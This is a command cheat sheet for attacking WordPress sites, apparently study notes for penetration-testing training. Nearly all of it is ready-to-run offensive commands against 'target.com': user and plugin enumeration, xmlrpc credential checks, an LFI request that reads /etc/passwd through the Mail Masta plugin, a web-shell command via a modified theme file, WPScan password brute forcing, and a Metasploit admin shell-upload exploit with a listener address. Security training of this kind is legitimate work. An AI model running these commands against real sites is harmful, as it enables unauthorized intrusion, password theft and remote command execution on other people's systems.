# WordPress Security Commands Cheat Sheet

## File Structure Exploration
```bash
# View WordPress directory structure
tree -L 1 /var/www/html

# View wp-content structure
tree -L 1 /var/www/html/wp-content

# View wp-includes structure
tree -L 1 /var/www/html/wp-includes
```

## Version Enumeration
```bash
# Extract WordPress version from meta generator tag
curl -s -X GET http://target.com | grep '<meta name="generator"'

# Check version in CSS/JS files (look for ver= parameter)
curl -s -X GET http://target.com | grep -E "(css|js)\?ver="
```

## Plugin and Theme Discovery
```bash
# Extract plugin information from source
curl -s -X GET http://target.com | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'wp-content/plugins/*' | cut -d"'" -f2

# Extract theme information from source
curl -s -X GET http://target.com | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'themes' | cut -d"'" -f2
```

## User Enumeration
```bash
# Check if user exists via author parameter (existing user returns 301)
curl -s -I http://target.com/?author=1

# Check if user exists (non-existing returns 404)
curl -s -I http://target.com/?author=100

# Enumerate users via JSON endpoint (WordPress < 4.7.1)
curl http://target.com/wp-json/wp/v2/users | jq
```

## Plugin Directory Access
```bash
# Check plugin directory access (301/200 = exists, 404 = doesn't exist)
curl -I -X GET http://target.com/wp-content/plugins/plugin-name

# View directory listing with html2text
curl -s -X GET http://target.com/wp-content/plugins/mail-masta/ | html2text
```

## Authentication Testing
```bash
# Test valid credentials via xmlrpc.php
curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>PASSWORD</value></param></params></methodCall>" http://target.com/xmlrpc.php

# Test invalid credentials (returns 403 fault)
curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>wrongpass</value></param></params></methodCall>" http://target.com/xmlrpc.php
```

## Exploitation
```bash
# Test LFI vulnerability (Mail Masta example)
curl http://target.com/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd

# Test RCE via modified theme file
curl -X GET "http://target.com/wp-content/themes/twentyseventeen/404.php?cmd=id"
```

## WPScan Usage
```bash
# Install WPScan
gem install wpscan

# Basic enumeration scan
wpscan --url http://target.com --enumerate --api-token YOUR_TOKEN

# Enumerate all plugins
wpscan --url http://target.com --enumerate ap

# Password brute force via xmlrpc
wpscan --password-attack xmlrpc -t 20 -U admin,user1 -P passwords.txt --url http://target.com

# Password brute force via wp-login
wpscan --password-attack wp-login -t 20 -U admin,user1 -P passwords.txt --url http://target.com
```

## Metasploit Usage
```bash
# Start Metasploit
msfconsole

# Search for WordPress modules
search wp_admin

# Use WordPress admin shell upload module
use exploit/unix/webapp/wp_admin_shell_upload

# View module options
options

# Set required options
set rhosts target.com
set username admin
set password password123
set lhost YOUR_IP

# Execute the exploit
run
```

## WordPress Configuration
```php
// Enable automatic core updates in wp-config.php
define( 'WP_AUTO_UPDATE_CORE', true );

// Enable automatic plugin updates
add_filter( 'auto_update_plugin', '__return_true' );

// Enable automatic theme updates
add_filter( 'auto_update_theme', '__return_true' );

// Enable debug mode
define( 'WP_DEBUG', true );
```
